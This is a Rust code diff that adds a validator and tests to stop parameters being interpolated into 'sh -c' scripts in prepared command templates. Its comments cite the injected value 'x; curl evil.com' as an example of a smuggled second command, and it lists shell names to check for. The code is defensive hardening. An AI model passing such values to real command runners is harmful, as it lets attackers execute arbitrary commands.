@@ -388,6 +388,52 @@ mod tests {
         assert_eq!(decrypt("pw", &payload).unwrap(), "hello");
     }
 
+    fn prepared(argv: Vec<&str>, params: Vec<&str>) -> PreparedCommand {
+        PreparedCommand {
+            name: "push".into(),
+            description: None,
+            argv: argv.into_iter().map(String::from).collect(),
+            stdin: None,
+            env: std::collections::BTreeMap::new(),
+            params: params.into_iter().map(String::from).collect(),
+            returns_output: true,
+        }
+    }
+
+    /// The prepared tier promises the caller supplies values and never syntax. A parameter pasted
+    /// into `sh -c` breaks that promise: `image = "x; curl evil.com"` becomes a second command.
+    #[test]
+    fn a_parameter_inside_a_shell_script_is_refused() {
+        let bad = prepared(vec!["sh", "-c", "docker push {{param:image}}"], vec!["image"]);
+        let err = format!("{:#}", bad.validate().unwrap_err());
+        assert!(err.contains("shell script"), "{err}");
+        assert!(err.contains("positional"), "it should say what to do instead: {err}");
+
+        // The same through an absolute path, which is how it would sneak past a name check.
+        let bad = prepared(vec!["/bin/bash", "-c", "echo {{param:x}}"], vec!["x"]);
+        assert!(bad.validate().is_err());
+    }
+
+    #[test]
+    fn a_parameter_as_a_positional_argument_is_accepted() {
+        // The pattern: the script references "$1", so the value is a shell variable — data.
+        let good = prepared(
+            vec!["sh", "-c", "docker push \"$1\"", "_", "{{param:image}}"],
+            vec!["image"],
+        );
+        assert!(good.validate().is_ok(), "{:?}", good.validate());
+
+        // And a shell with no -c at all is unremarkable.
+        let good = prepared(vec!["docker", "push", "{{param:image}}"], vec!["image"]);
+        assert!(good.validate().is_ok());
+    }
+
+    #[test]
+    fn a_parameter_name_must_be_a_plain_identifier() {
+        let bad = prepared(vec!["true"], vec!["not a name"]);
+        assert!(bad.validate().is_err());
+    }
+
     #[test]
     fn a_generated_secret_has_the_requested_length_and_a_safe_alphabet() {
         for len in [16usize, 32, 64, 100] {
@@ -717,6 +763,49 @@ type BTreeMapString = std::collections::BTreeMap<String, String>;
 
 fn default_true() -> bool {
     true
+}
+
+impl PreparedCommand {
+    /// Refuse a template that interpolates a parameter into a shell script.
+    ///
+    /// The agent runs no shell, so a parameter is data — unless the template itself invokes one and
+    /// pastes the parameter into the script it passes. `sh -c "docker push {{param:image}}"` hands
+    /// the caller a shell, and `image = x; curl evil.com` is then a second command. The whole point
+    /// of the prepared tier is that the caller supplies values and never syntax, so this is checked
+    /// when the command is stored rather than trusted to review.
+    ///
+    /// A shell is fine; passing the parameter to it as a positional argument is the pattern:
+    ///
+    /// ```json
+    /// "argv": ["sh", "-c", "docker push \"$1\"", "_", "{{param:image}}"]
+    /// ```
+    pub fn validate(&self) -> Result<()> {
+        const SHELLS: [&str; 5] = ["sh", "bash", "dash", "zsh", "ksh"];
+        let Some(program) = self.argv.first() else {
+            bail!("prepared command '{}' has no argv", self.name);
+        };
+        let base = program.rsplit('/').next().unwrap_or(program);
+        if SHELLS.contains(&base) {
+            if let Some(index) = self.argv.iter().position(|a| a == "-c") {
+                if let Some(script) = self.argv.get(index + 1) {
+                    if script.contains("{{param:") {
+                        bail!(
+                            "prepared command '{}' interpolates a parameter into a shell script, \
+                             which lets a caller supply syntax instead of a value. Pass it as a \
+                             positional argument instead: [\"sh\", \"-c\", \"... \\\"$1\\\" ...\", \"_\", \"{{{{param:name}}}}\"]",
+                            self.name
+                        );
+                    }
+                }
+            }
+        }
+        for name in &self.params {
+            if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-') {
+                bail!("parameter name '{name}' should be alphanumeric with _ or -");
+            }
+        }
+        Ok(())
+    }
 }
 
 impl VaultItem {
